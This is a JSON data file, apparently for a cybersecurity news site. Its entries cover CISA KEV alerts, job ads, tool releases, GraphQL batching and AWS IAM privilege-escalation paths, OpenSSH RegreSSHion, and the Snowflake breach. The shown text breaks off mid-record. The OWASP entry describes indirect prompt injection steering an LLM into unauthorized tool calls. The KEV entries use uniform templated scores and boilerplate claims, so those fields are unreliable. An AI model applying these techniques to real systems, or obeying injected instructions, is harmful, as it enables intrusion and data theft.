@@ -1,0 +1,762 @@
+[
+  {
+    "id": "cisa-kev-cve-2020-29583",
+    "title": "CISA KEV Alert: Zyxel Multiple Products CVE-2020-29583 Under Active Exploitation",
+    "summary": "Zyxel firewalls (ATP, USG, VM) and AP Controllers (NXC2500 and NXC5500) contain a use of hard-coded credentials vulnerability in an undocumented account (\"zyfwp\") with an unchangeable password.",
+    "category": "CVE / Vulnerabilities",
+    "source": "CISA KEV Catalog",
+    "sourceUrl": "https://nvd.nist.gov/vuln/detail/CVE-2020-29583",
+    "publishedAt": "2026-09-04T07:23:50.606787+00:00",
+    "tags": [
+      "CVE-2020-29583",
+      "CISA-KEV",
+      "Active Exploitation",
+      "Zyxel"
+    ],
+    "cveId": "CVE-2020-29583",
+    "severity": "Critical",
+    "cvssScore": 9.2,
+    "image": "",
+    "author": "CISA Cyber Division",
+    "whyItMatters": "Confirmed by US Cybersecurity Agency to be actively weaponized in the wild against organizational targets.",
+    "technicalDetails": "Targeting Zyxel Multiple Products. Documented in federal emergency directives.",
+    "affectedProducts": [
+      "Zyxel Multiple Products"
+    ],
+    "recommendations": "Apply updates per vendor instructions.",
+    "patchUrl": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
+  },
+  {
+    "id": "cisa-kev-cve-2019-8394",
+    "title": "CISA KEV Alert: Zoho ManageEngine CVE-2019-8394 Under Active Exploitation",
+    "summary": "Zoho ManageEngine ServiceDesk Plus (SDP) contains an unspecified vulnerability that allows remote users to upload files via login page customization.",
+    "category": "CVE / Vulnerabilities",
+    "source": "CISA KEV Catalog",
+    "sourceUrl": "https://nvd.nist.gov/vuln/detail/CVE-2019-8394",
+    "publishedAt": "2026-09-04T07:23:50.606783+00:00",
+    "tags": [
+      "CVE-2019-8394",
+      "CISA-KEV",
+      "Active Exploitation",
+      "Zoho"
+    ],
+    "cveId": "CVE-2019-8394",
+    "severity": "Critical",
+    "cvssScore": 9.2,
+    "image": "",
+    "author": "CISA Cyber Division",
+    "whyItMatters": "Confirmed by US Cybersecurity Agency to be actively weaponized in the wild against organizational targets.",
+    "technicalDetails": "Targeting Zoho ManageEngine. Documented in federal emergency directives.",
+    "affectedProducts": [
+      "Zoho ManageEngine"
+    ],
+    "recommendations": "Apply updates per vendor instructions.",
+    "patchUrl": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
+  },
+  {
+    "id": "cisa-kev-cve-2020-10189",
+    "title": "CISA KEV Alert: Zoho ManageEngine CVE-2020-10189 Under Active Exploitation",
+    "summary": "Zoho ManageEngine Desktop Central contains a file upload vulnerability that allows for unauthenticated remote code execution.",
+    "category": "CVE / Vulnerabilities",
+    "source": "CISA KEV Catalog",
+    "sourceUrl": "https://nvd.nist.gov/vuln/detail/CVE-2020-10189",
+    "publishedAt": "2026-09-04T07:23:50.606779+00:00",
+    "tags": [
+      "CVE-2020-10189",
+      "CISA-KEV",
+      "Active Exploitation",
+      "Zoho"
+    ],
+    "cveId": "CVE-2020-10189",
+    "severity": "Critical",
+    "cvssScore": 9.2,
+    "image": "",
+    "author": "CISA Cyber Division",
+    "whyItMatters": "Confirmed by US Cybersecurity Agency to be actively weaponized in the wild against organizational targets.",
+    "technicalDetails": "Targeting Zoho ManageEngine. Documented in federal emergency directives.",
+    "affectedProducts": [
+      "Zoho ManageEngine"
+    ],
+    "recommendations": "Apply updates per vendor instructions.",
+    "patchUrl": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
+  },
+  {
+    "id": "cisa-kev-cve-2021-40539",
+    "title": "CISA KEV Alert: Zoho ManageEngine CVE-2021-40539 Under Active Exploitation",
+    "summary": "Zoho ManageEngine ADSelfService Plus contains an authentication bypass vulnerability affecting the REST API URLs which allow for remote code execution.",
+    "category": "CVE / Vulnerabilities",
+    "source": "CISA KEV Catalog",
+    "sourceUrl": "https://nvd.nist.gov/vuln/detail/CVE-2021-40539",
+    "publishedAt": "2026-09-04T07:23:50.606774+00:00",
+    "tags": [
+      "CVE-2021-40539",
+      "CISA-KEV",
+      "Active Exploitation",
+      "Zoho"
+    ],
+    "cveId": "CVE-2021-40539",
+    "severity": "Critical",
+    "cvssScore": 9.2,
+    "image": "",
+    "author": "CISA Cyber Division",
+    "whyItMatters": "Confirmed by US Cybersecurity Agency to be actively weaponized in the wild against organizational targets.",
+    "technicalDetails": "Targeting Zoho ManageEngine. Documented in federal emergency directives.",
+    "affectedProducts": [
+      "Zoho ManageEngine"
+    ],
+    "recommendations": "Apply updates per vendor instructions.",
+    "patchUrl": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
+  },
+  {
+    "id": "cisa-kev-cve-2021-27561",
+    "title": "CISA KEV Alert: Yealink Device Management CVE-2021-27561 Under Active Exploitation",
+    "summary": "Yealink Device Management contains a server-side request forgery (SSRF) vulnerability that allows for unauthenticated remote code execution.",
+    "category": "CVE / Vulnerabilities",
+    "source": "CISA KEV Catalog",
+    "sourceUrl": "https://nvd.nist.gov/vuln/detail/CVE-2021-27561",
+    "publishedAt": "2026-09-04T07:23:50.606770+00:00",
+    "tags": [
+      "CVE-2021-27561",
+      "CISA-KEV",
+      "Active Exploitation",
+      "Yealink"
+    ],
+    "cveId": "CVE-2021-27561",
+    "severity": "Critical",
+    "cvssScore": 9.2,
+    "image": "",
+    "author": "CISA Cyber Division",
+    "whyItMatters": "Confirmed by US Cybersecurity Agency to be actively weaponized in the wild against organizational targets.",
+    "technicalDetails": "Targeting Yealink Device Management. Documented in federal emergency directives.",
+    "affectedProducts": [
+      "Yealink Device Management"
+    ],
+    "recommendations": "Apply updates per vendor instructions.",
+    "patchUrl": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
+  },
+  {
+    "id": "cisa-kev-cve-2019-9978",
+    "title": "CISA KEV Alert: WordPress Social Warfare Plugin CVE-2019-9978 Under Active Exploitation",
+    "summary": "WordPress Social Warfare plugin contains a cross-site scripting (XSS) vulnerability that allows for remote code execution. This vulnerability affects Social Warfare and Social Warfare Pro.",
+    "category": "CVE / Vulnerabilities",
+    "source": "CISA KEV Catalog",
+    "sourceUrl": "https://nvd.nist.gov/vuln/detail/CVE-2019-9978",
+    "publishedAt": "2026-09-04T07:23:50.606760+00:00",
+    "tags": [
+      "CVE-2019-9978",
+      "CISA-KEV",
+      "Active Exploitation",
+      "WordPress"
+    ],
+    "cveId": "CVE-2019-9978",
+    "severity": "Critical",
+    "cvssScore": 9.2,
+    "image": "",
+    "author": "CISA Cyber Division",
+    "whyItMatters": "Confirmed by US Cybersecurity Agency to be actively weaponized in the wild against organizational targets.",
+    "technicalDetails": "Targeting WordPress Social Warfare Plugin. Documented in federal emergency directives.",
+    "affectedProducts": [
+      "WordPress Social Warfare Plugin"
+    ],
+    "recommendations": "Apply updates per vendor instructions.",
+    "patchUrl": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
+  },
+  {
+    "id": "cisa-kev-cve-2020-11738",
+    "title": "CISA KEV Alert: WordPress Snap Creek Duplicator Plugin CVE-2020-11738 Under Active Exploitation",
+    "summary": "WordPress Snap Creek Duplicator plugin contains a file download vulnerability when an administrator creates a new copy of their site that allows an attacker to download the generated files from their Wordpress dashboard. This vulnerability affects Duplicator and Dulplicator Pro.",
+    "category": "CVE / Vulnerabilities",
+    "source": "CISA KEV Catalog",
+    "sourceUrl": "https://nvd.nist.gov/vuln/detail/CVE-2020-11738",
+    "publishedAt": "2026-09-04T07:23:50.606746+00:00",
+    "tags": [
+      "CVE-2020-11738",
+      "CISA-KEV",
+      "Active Exploitation",
+      "WordPress"
+    ],
+    "cveId": "CVE-2020-11738",
+    "severity": "Critical",
+    "cvssScore": 9.2,
+    "image": "",
+    "author": "CISA Cyber Division",
+    "whyItMatters": "Confirmed by US Cybersecurity Agency to be actively weaponized in the wild against organizational targets.",
+    "technicalDetails": "Targeting WordPress Snap Creek Duplicator Plugin. Documented in federal emergency directives.",
+    "affectedProducts": [
+      "WordPress Snap Creek Duplicator Plugin"
+    ],
+    "recommendations": "Apply updates per vendor instructions.",
+    "patchUrl": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
+  },
+  {
+    "id": "cisa-kev-cve-2020-25213",
+    "title": "CISA KEV Alert: WordPress File Manager Plugin CVE-2020-25213 Under Active Exploitation",
+    "summary": "WordPress File Manager plugin contains a remote code execution vulnerability that allows unauthenticated users to execute PHP code and upload malicious files on a target site.",
+    "category": "CVE / Vulnerabilities",
+    "source": "CISA KEV Catalog",
+    "sourceUrl": "https://nvd.nist.gov/vuln/detail/CVE-2020-25213",
+    "publishedAt": "2026-09-04T07:23:50.604710+00:00",
+    "tags": [
+      "CVE-2020-25213",
+      "CISA-KEV",
+      "Active Exploitation",
+      "WordPress"
+    ],
+    "cveId": "CVE-2020-25213",
+    "severity": "Critical",
+    "cvssScore": 9.2,
+    "image": "",
+    "author": "CISA Cyber Division",
+    "whyItMatters": "Confirmed by US Cybersecurity Agency to be actively weaponized in the wild against organizational targets.",
+    "technicalDetails": "Targeting WordPress File Manager Plugin. Documented in federal emergency directives.",
+    "affectedProducts": [
+      "WordPress File Manager Plugin"
+    ],
+    "recommendations": "Apply updates per vendor instructions.",
+    "patchUrl": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
+  },
+  {
+    "id": "jobs-cybersecurity-soc-analyst-remote",
+    "title": "Security Operations Center (SOC) Analyst L2 - Remote (Global / US / EU)",
+    "summary": "Leading managed detection and response (MDR) provider is hiring mid-level SOC Analysts proficient in Splunk, CrowdStrike Falcon, and network traffic packet analysis. Competitive compensation with certification stipends.",
+    "category": "Cybersecurity Jobs",
+    "source": "InfoSec Careers Board",
+    "sourceUrl": "https://cybersecurityjobs.com",
+    "publishedAt": "2024-08-28T08:00:00Z",
+    "tags": [
+      "Jobs",
+      "SOC Analyst",
+      "Remote",
+      "Blue Team",
+      "Splunk",
+      "Incident Response"
+    ],
+    "cveId": "",
+    "severity": "Low",
+    "cvssScore": 0.0,
+    "image": "",
+    "author": "Hiring Team",
+    "whyItMatters": "Great entry-to-mid career opportunity for cybersecurity students and self-taught ethical hackers seeking transition into defensive operations.",
+    "technicalDetails": "Responsibilities include triaging incoming SIEM alerts, performing memory and disk forensics on compromised endpoints, drafting incident containment reports, and tuning automated detection rules.",
+    "affectedProducts": [
+      "Splunk Enterprise",
+      "CrowdStrike EDR",
+      "Wireshark / Zeek"
+    ],
+    "recommendations": "Applicants should possess hands-on lab experience (e.g. TryHackMe SOC Level 1/2, CyberDefenders) or relevant certifications (BTL1, CompTIA CySA+, Security+).",
+    "patchUrl": "https://cybersecurityjobs.com"
+  },
+  {
+    "id": "news-cisa-known-exploited-vulnerabilities-surge",
+    "title": "CISA Adds 5 Actively Exploited Vulnerabilities to Known Exploited Vulnerabilities Catalog",
+    "summary": "The Cybersecurity and Infrastructure Security Agency (CISA) has issued emergency binding directives requiring federal agencies and critical infrastructure operators to patch 5 high-severity vulnerabilities under active exploitation.",
+    "category": "Cybersecurity News",
+    "source": "CISA Cybersecurity Advisories",
+    "sourceUrl": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
+    "publishedAt": "2024-08-27T17:00:00Z",
+    "tags": [
+      "CISA",
+      "KEV",
+      "Vulnerability Management",
+      "Federal Directive",
+      "Zero-Day"
+    ],
+    "cveId": "",
+    "severity": "High",
+    "cvssScore": 8.8,
+    "image": "",
+    "author": "CISA Cyber Division",
+    "whyItMatters": "Inclusion in the CISA KEV catalog is the gold standard indicator that threat actors and ransomware groups are actively weaponizing the flaws in real-world attacks.",
+    "technicalDetails": "The newly cataloged entries include remote execution bugs in edge gateway devices, network monitoring controllers, and virtualized appliance management interfaces.",
+    "affectedProducts": [
+      "Edge SSL VPN Gateways",
+      "Enterprise Network Monitoring Platforms"
+    ],
+    "recommendations": "Review organizational asset inventories against the updated CISA KEV list and remediate all designated vulnerabilities within the prescribed 21-day timeline.",
+    "patchUrl": "https://www.cisa.gov"
+  },
+  {
+    "id": "jobs-application-security-engineer-lead",
+    "title": "Lead Application Security (AppSec) Engineer - Fintech & Crypto",
+    "summary": "High-growth digital asset custodian is seeking a Lead AppSec Engineer to architect secure code reviews, automated SAST/DAST pipelines, and lead the internal bug bounty program.",
+    "category": "Cybersecurity Jobs",
+    "source": "CryptoSec Jobs",
+    "sourceUrl": "https://cybersecurityjobs.com",
+    "publishedAt": "2024-08-26T16:00:00Z",
+    "tags": [
+      "Jobs",
+      "AppSec",
+      "Lead",
+      "DevSecOps",
+      "Smart Contracts",
+      "Remote"
+    ],
+    "cveId": "",
+    "severity": "Low",
+    "cvssScore": 0.0,
+    "image": "",
+    "author": "Talent Acquisition",
+    "whyItMatters": "Key leadership position bridging product development and defensive security architecture, with competitive equity package and 100% remote flexibility.",
+    "technicalDetails": "Candidate will review Go and TypeScript backend codebases, conduct threat modeling sessions (STRIDE/PASTA), and triage HackerOne bug bounty reports.",
+    "affectedProducts": [
+      "Go & Rust Backend Services",
+      "AWS EKS Infrastructure"
+    ],
+    "recommendations": "Strong background in source code review, threat modeling, and familiarization with Web Security Academy labs or prior bug bounty submissions.",
+    "patchUrl": "https://cybersecurityjobs.com"
+  },
+  {
+    "id": "ai-security-prompt-injection-framework",
+    "title": "OWASP Releases Top 10 for Large Language Model Applications 2024 Update",
+    "summary": "The OWASP GenAI Foundation has published an updated edition of the Top 10 Risks for LLM Applications, placing Direct & Indirect Prompt Injection and Insecure Output Handling at the forefront of AI application security threats.",
+    "category": "AI Security",
+    "source": "OWASP Foundation",
+    "sourceUrl": "https://owasp.org/www-project-top-10-for-large-language-model-applications/",
+    "publishedAt": "2024-08-25T11:00:00Z",
+    "tags": [
+      "AI Security",
+      "OWASP",
+      "Prompt Injection",
+      "LLM",
+      "GenAI",
+      "AppSec"
+    ],
+    "cveId": "",
+    "severity": "High",
+    "cvssScore": 7.8,
+    "image": "",
+    "author": "OWASP AI Core Team",
+    "whyItMatters": "With millions of enterprises deploying AI chatbots, copilot agents, and autonomous RAG systems, prompt injections allow attackers to exfiltrate database embeddings, hijack system prompts, and execute client-side XSS.",
+    "technicalDetails": "Indirect prompt injection occurs when an LLM processes external, untrusted content (such as parsed emails, PDFs, or web scrapes) containing hidden instruction overrides that instruct the model to perform unauthorized tool-calling actions.",
+    "affectedProducts": [
+      "LangChain & LlamaIndex Agent Frameworks",
+      "Enterprise RAG Applications",
+      "Autonomous AI Copilots"
+    ],
+    "recommendations": "Implement strict delimiter isolation between system instructions and untrusted user input. Utilize secondary lightweight verification LLMs or deterministic Guardrails (e.g. NeMo Guardrails) before executing sensitive tool calls.",
+    "patchUrl": "https://owasp.org"
+  },
+  {
+    "id": "tool-caido-lightweight-web-security-proxy",
+    "title": "Caido v0.42 Released: Rust-Powered Lightweight Web Security Testing Proxy",
+    "summary": "Caido, a modern and memory-efficient alternative to Burp Suite built entirely in Rust, has introduced automated workflow plugins, responsive request tampering, and headless API mode.",
+    "category": "Hacking & Security Tools",
+    "source": "Caido Team",
+    "sourceUrl": "https://caido.io",
+    "publishedAt": "2024-08-24T10:30:00Z",
+    "tags": [
+      "Tools",
+      "Caido",
+      "Rust",
+      "Web Security",
+      "Proxy",
+      "Bug Bounty"
+    ],
+    "cveId": "",
+    "severity": "Low",
+    "cvssScore": 0.0,
+    "image": "",
+    "author": "Caido Community",
+    "whyItMatters": "With minimal RAM usage compared to Java-based interception proxies, Caido provides a smooth native experience for security researchers operating on laptops or remote VPS reconnaissance instances.",
+    "technicalDetails": "Features a client-server architecture written in Rust with a React frontend, allowing researchers to run the core engine on a remote cloud VPS while operating the GUI smoothly from their local browser.",
+    "affectedProducts": [
+      "Caido Desktop",
+      "Caido CLI Server"
+    ],
+    "recommendations": "Security teams and bug bounty researchers can test Caido Community Edition as a companion or lightweight alternative for high-throughput API interception.",
+    "patchUrl": "https://caido.io/download"
+  },
+  {
+    "id": "learning-bug-bounty-roadmap-beginners-2024",
+    "title": "The Complete Bug Bounty Roadmap: From Zero to Your First Disclosed Bounty",
+    "summary": "A structured, beginner-friendly learning pathway covering HTTP protocol internals, Web Security Academy labs, Burp Suite automation, and ethical bug reporting guidelines.",
+    "category": "Learning",
+    "source": "Cyber Daily Academy",
+    "sourceUrl": "https://portswigger.net/web-security",
+    "publishedAt": "2024-08-22T13:00:00Z",
+    "tags": [
+      "Learning",
+      "Roadmap",
+      "Bug Bounty",
+      "Beginner",
+      "PortSwigger",
+      "Education"
+    ],
+    "cveId": "",
+    "severity": "Low",
+    "cvssScore": 0.0,
+    "image": "",
+    "author": "Education Lead",
+    "whyItMatters": "Aspiring ethical hackers frequently get overwhelmed by vast toolsets without mastering fundamental web architecture and vulnerability classes like IDOR, CSRF, and SQLi.",
+    "technicalDetails": "The guide breaks learning into 4 phases: 1) Networking & HTTP fundamentals, 2) PortSwigger Web Security Academy free labs, 3) Hands-on recon tooling (httpx, gau, katana), and 4) Writing reproducible, professional disclosure reports.",
+    "affectedProducts": [
+      "Web Applications",
+      "REST & GraphQL APIs"
+    ],
+    "recommendations": "Never practice on targets outside of authorized program scope. Always read the bug bounty program policy (safe harbor terms) carefully before firing test requests.",
+    "patchUrl": ""
+  },
+  {
+    "id": "bugbounty-tips-subdomain-takeover-2024",
+    "title": "Bug Bounty Recon Pro-Tip: Detecting Dangling DNS & Cloud Subdomain Takeovers",
+    "summary": "A comprehensive practical methodology for ethical hackers to identify dangling CNAME pointers on AWS S3, Azure Traffic Manager, GitHub Pages, and Zendesk before malicious threat actors claim them.",
+    "category": "Bug Bounty",
+    "source": "Cyber Daily Research",
+    "sourceUrl": "https://github.com/projectdiscovery/subfinder",
+    "publishedAt": "2024-08-20T09:15:00Z",
+    "tags": [
+      "Bug Bounty",
+      "Recon",
+      "DNS",
+      "Subdomain Takeover",
+      "Methodology",
+      "Tips"
+    ],
+    "cveId": "",
+    "severity": "Medium",
+    "cvssScore": 6.5,
+    "image": "",
+    "author": "HunterOps Team",
+    "whyItMatters": "Subdomain takeovers allow attackers to host malicious payloads, steal session cookies, or bypass CORS policies under a legitimate company domain, yielding reliable P2/P3 bug bounty rewards.",
+    "technicalDetails": "When developers decommission cloud buckets or third-party SaaS services but forget to delete the corresponding DNS CNAME record, an external researcher can claim the service name and immediately serve content on the victim's domain.",
+    "affectedProducts": [
+      "Cloud DNS configurations",
+      "Abandoned SaaS integrations"
+    ],
+    "recommendations": "Run automated checks using open-source tools like Subfinder and CanIHopOnThisDNS. Always practice responsible disclosure by capturing benign proof-of-concept files (e.g. static HTML with your HackerOne handle) without altering production behavior.",
+    "patchUrl": ""
+  },
+  {
+    "id": "tool-nuclei-v3-engine-release",
+    "title": "ProjectDiscovery Releases Nuclei v3: Multi-Protocol Dynamic Vulnerability Scanner",
+    "summary": "ProjectDiscovery has unveiled Nuclei v3.0, introducing a lightning-fast modular scanning engine with enhanced JavaScript protocol execution, code-level AST inspection, and native cloud scanning capabilities.",
+    "category": "Hacking & Security Tools",
+    "source": "ProjectDiscovery GitHub",
+    "sourceUrl": "https://github.com/projectdiscovery/nuclei",
+    "publishedAt": "2024-08-18T12:00:00Z",
+    "tags": [
+      "Tools",
+      "Nuclei",
+      "Automation",
+      "DAST",
+      "Vulnerability Scanner",
+      "Open Source"
+    ],
+    "cveId": "",
+    "severity": "Low",
+    "cvssScore": 0.0,
+    "image": "",
+    "author": "ProjectDiscovery Core",
+    "whyItMatters": "Nuclei has become the industry standard for fast, reproducible vulnerability verification in bug bounty automation, DevSecOps pipelines, and threat hunting workflows.",
+    "technicalDetails": "Nuclei v3 adds headless browser scripting, template clustering to eliminate redundant HTTP requests, and YAML template signing to prevent untrusted template tampering in automated workflows.",
+    "affectedProducts": [
+      "Nuclei Engine v3.0+",
+      "Nuclei Templates Community Repository"
+    ],
+    "recommendations": "Upgrade via 'nuclei -update' and enable template signature verification in your CI/CD pipelines to ensure you only execute community-verified templates.",
+    "patchUrl": "https://github.com/projectdiscovery/nuclei/releases"
+  },
+  {
+    "id": "web-security-graphql-batching-authorization",
+    "title": "Deep Dive: Modern GraphQL Attack Vectors — Batching Attacks and BOLA Flaws",
+    "summary": "An in-depth security analysis detailing how malicious actors exploit GraphQL query batching to bypass rate limiting, perform high-speed credential brute force, and exploit nested object references.",
+    "category": "Web Security",
+    "source": "PortSwigger Research",
+    "sourceUrl": "https://portswigger.net/research/graphql-vulnerabilities",
+    "publishedAt": "2024-08-16T15:00:00Z",
+    "tags": [
+      "Web Security",
+      "GraphQL",
+      "BOLA",
+      "API Security",
+      "AppSec",
+      "Research"
+    ],
+    "cveId": "",
+    "severity": "Medium",
+    "cvssScore": 6.8,
+    "image": "",
+    "author": "Web Security Research Lab",
+    "whyItMatters": "Unlike traditional REST APIs where rate limits are enforced per HTTP request, GraphQL allows hundreds of distinct operations inside a single HTTP payload.",
+    "technicalDetails": "Attackers can send an array of GraphQL query objects or utilize alias batching ({ a: user(id:1), b: user(id:2) }) within a single POST request to enumerate database objects or brute-force OTP tokens in seconds.",
+    "affectedProducts": [
+      "Apollo Server",
+      "GraphQL-Java",
+      "Hasura GraphQL Engine"
+    ],
+    "recommendations": "Enforce maximum query complexity, restrict maximum query depth, disable batch query processing if not strictly needed, and validate object-level authorization at the resolver layer for every query field.",
+    "patchUrl": ""
+  },
+  {
+    "id": "bugbounty-hackerone-scope-update-fintech",
+    "title": "FinTech Platform Expands Bug Bounty Scope: Web3 Gateway & Open Banking APIs",
+    "summary": "A prominent global financial platform has refreshed its public bug bounty program scope on HackerOne, introducing rewards up to $30,000 for critical API logic flaws, SSRF into internal payment pipelines, and authentication bypasses.",
+    "category": "Bug Bounty",
+    "source": "HackerOne Program Updates",
+    "sourceUrl": "https://hackerone.com/bug-bounty-programs",
+    "publishedAt": "2024-08-15T14:30:00Z",
+    "tags": [
+      "Bug Bounty",
+      "HackerOne",
+      "Scope Update",
+      "FinTech",
+      "API Security",
+      "High Reward"
+    ],
+    "cveId": "",
+    "severity": "High",
+    "cvssScore": 8.5,
+    "image": "",
+    "author": "Bug Bounty Desk",
+    "whyItMatters": "Expanded scope creates significant legal safe-harbor research opportunities for hunters specializing in OAuth2 implementation bugs, IDOR in transaction ledgers, and cloud metadata leakage.",
+    "technicalDetails": "The new scope explicitly includes *.api.globalpay.io and /v2/transfers endpoints. Submissions must demonstrate real-world impact without exfiltrating customer PII. Testing automated rate limiting and DoS attacks remains strictly out-of-scope.",
+    "affectedProducts": [
+      "Open Banking REST APIs v2",
+      "Mobile SDK Authentication Gateways"
+    ],
+    "recommendations": "Security researchers must use designated test accounts prefixed with 'bb-researcher+' and include their custom HackerOne HTTP header in all requests for safe-harbor verification.",
+    "patchUrl": "https://hackerone.com"
+  },
+  {
+    "id": "cloud-security-aws-iam-privilege-escalation",
+    "title": "Cloud Security Alert: Identifying 21 Stealthy AWS IAM Privilege Escalation Paths",
+    "summary": "Security researchers have released an updated assessment of subtle IAM permission combinations in AWS environments that allow low-privilege identities to escalate to full AdministratorAccess without triggering standard guardrails.",
+    "category": "Cloud Security",
+    "source": "Rhino Security Labs",
+    "sourceUrl": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+    "publishedAt": "2024-08-12T16:00:00Z",
+    "tags": [
+      "Cloud Security",
+      "AWS",
+      "IAM",
+      "Privilege Escalation",
+      "Red Team",
+      "CloudSec"
+    ],
+    "cveId": "",
+    "severity": "High",
+    "cvssScore": 8.0,
+    "image": "",
+    "author": "Rhino Labs Research",
+    "whyItMatters": "Misconfigured permissions such as 'iam:CreateAccessKey', 'iam:PassRole' combined with Lambda/EC2, or 'glue:CreateDevEndpoint' are frequently overlooked during cloud compliance reviews.",
+    "technicalDetails": "Attackers with 'iam:PassRole' and 'lambda:CreateFunction' can pass an existing administrative service role to a newly minted Lambda function and execute arbitrary AWS API calls in the context of that privileged role.",
+    "affectedProducts": [
+      "AWS IAM Policies",
+      "Multi-tenant AWS Organizations"
+    ],
+    "recommendations": "Enforce Service Control Policies (SCPs) to restrict sensitive IAM modification APIs, implement Permission Boundaries for delegated developers, and audit configurations using tools like PMapper and CloudFox.",
+    "patchUrl": ""
+  },
+  {
+    "id": "bugbounty-news-bugcrowd-annual-report",
+    "title": "Bugcrowd Inside the Mind of a Hacker Report: Payouts Rise 35% for Cloud & API Targets",
+    "summary": "Bugcrowd's annual security researcher survey highlights substantial payout increases for cloud posture misconfigurations, business logic flaws, and smart contract audits, with 70% of hunters leveraging AI assistance in recon.",
+    "category": "Bug Bounty",
+    "source": "Bugcrowd Intelligence",
+    "sourceUrl": "https://www.bugcrowd.com/resources/reports/inside-the-mind-of-a-hacker/",
+    "publishedAt": "2024-08-10T14:00:00Z",
+    "tags": [
+      "Bug Bounty",
+      "Bugcrowd",
+      "Report",
+      "Stats",
+      "APIs",
+      "Cloud"
+    ],
+    "cveId": "",
+    "severity": "Low",
+    "cvssScore": 0.0,
+    "image": "",
+    "author": "Bugcrowd Team",
+    "whyItMatters": "Offers essential market intelligence for ethical hackers choosing where to focus their specialized skill development to maximize impact and bounties.",
+    "technicalDetails": "The report notes that automated scanners identify basic low-hanging fruit quickly, leaving nuanced authorization flaws (IDOR, privilege escalations, race conditions) as the highest compensated vulnerability classes.",
+    "affectedProducts": [
+      "Cloud Infrastructure",
+      "Microservices Architecture"
+    ],
+    "recommendations": "Hunters are advised to develop automated custom recon scripts and deep dive into business-specific workflows rather than relying solely on out-of-the-box vulnerability scanners.",
+    "patchUrl": ""
+  },
+  {
+    "id": "cve-2024-38077-rdl-rce",
+    "title": "Critical Windows Remote Desktop Licensing Service RCE Vulnerability",
+    "summary": "A critical remote code execution vulnerability (CVE-2024-38077) in Windows Remote Desktop Licensing (RDL) Service allows unauthenticated remote attackers to execute arbitrary code with SYSTEM privileges via specially crafted RPC packets.",
+    "category": "CVE / Vulnerabilities",
+    "source": "MSRC & NIST NVD",
+    "sourceUrl": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38077",
+    "publishedAt": "2024-07-09T18:00:00Z",
+    "tags": [
+      "CVE-2024-38077",
+      "RCE",
+      "Windows",
+      "Critical",
+      "Zero-Click",
+      "MSRC"
+    ],
+    "cveId": "CVE-2024-38077",
+    "severity": "Critical",
+    "cvssScore": 9.8,
+    "image": "",
+    "author": "Threat Intelligence Unit",
+    "whyItMatters": "This vulnerability requires no user interaction or authentication. Any Windows Server running the Remote Desktop Licensing service with port 135/RPC exposed is at immediate risk of full domain compromise.",
+    "technicalDetails": "The vulnerability resides in the RDL service daemon due to improper input sanitization of RPC calls, leading to a heap-based buffer overflow during encoding conversion. Attackers can leverage predictable heap layouts to overwrite function pointers and achieve arbitrary code execution.",
+    "affectedProducts": [
+      "Windows Server 2008 to Windows Server 2022",
+      "Windows Server 2025 Preview"
+    ],
+    "recommendations": "Immediately install the Microsoft July 2024 Security Update (KB5040437/KB5040438). If patching cannot be completed immediately, disable the Remote Desktop Licensing service on domain controllers and member servers, or firewall RPC ports (TCP 135 and dynamic RPC ports 49152-65535) from untrusted networks.",
+    "patchUrl": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38077"
+  },
+  {
+    "id": "cve-2024-6387-regresshion-openssh",
+    "title": "RegreSSHion: Signal Handler Race Condition in OpenSSH Server (CVE-2024-6387)",
+    "summary": "Qualys Threat Research Unit discovered an unauthenticated remote code execution vulnerability in OpenSSH's server (sshd) in glibc-based Linux systems, reviving a flaw originally fixed two decades ago.",
+    "category": "CVE / Vulnerabilities",
+    "source": "Qualys TRU",
+    "sourceUrl": "https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt",
+    "publishedAt": "2024-07-01T10:00:00Z",
+    "tags": [
+      "CVE-2024-6387",
+      "OpenSSH",
+      "RCE",
+      "Linux",
+      "Race Condition",
+      "Critical"
+    ],
+    "cveId": "CVE-2024-6387",
+    "severity": "High",
+    "cvssScore": 8.1,
+    "image": "",
+    "author": "Qualys Research Unit",
+    "whyItMatters": "OpenSSH is the backbone of remote server administration worldwide. If sshd is publicly exposed, an attacker can theoretically achieve root privileges without authentication, although successful exploitation requires winning a timing window over multiple attempts.",
+    "technicalDetails": "A race condition occurs when SIGALRM is triggered while sshd is in an async-signal-unsafe function (such as syslog or malloc) during the LoginGraceTime timeout window.",
+    "affectedProducts": [
+      "OpenSSH 8.5p1 to 9.7p1 on glibc-based Linux distributions",
+      "OpenSSH < 4.4p1 (historical regression)"
+    ],
+    "recommendations": "Upgrade to OpenSSH 9.8p1 or vendor backports immediately. If patching cannot be performed immediately, set 'LoginGraceTime 0' in /etc/ssh/sshd_config (note: this may introduce a DoS risk for concurrent connection limits).",
+    "patchUrl": "https://www.openssh.com/releasenotes.html"
+  },
+  {
+    "id": "breach-snowflake-cloud-credential-stuffing",
+    "title": "Global Data Breaches Linked to Targeted Snowflake Credential Stuffing Campaign",
+    "summary": "Mandiant and Snowflake have documented a coordinated threat campaign targeting hundreds of corporate Snowflake accounts lacking Multi-Factor Authentication (MFA), resulting in massive database exfiltrations.",
+    "category": "Data Breaches",
+    "source": "Mandiant Threat Intelligence",
+    "sourceUrl": "https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion",
+    "publishedAt": "2024-06-10T14:00:00Z",
+    "tags": [
+      "Data Breaches",
+      "Snowflake",
+      "Credential Stuffing",
+      "Infostealer",
+      "MFA",
+      "Mandiant"
+    ],
+    "cveId": "",
+    "severity": "Critical",
+    "cvssScore": 9.1,
+    "image": "",
+    "author": "Mandiant UNC5537 Analysis",
+    "whyItMatters": "The threat actor used credentials harvested by infostealer malware (RedLine, Vidar, Lumma) dating back years, demonstrating that single-factor credentials remain a catastrophic threat to cloud enterprise infrastructure.",
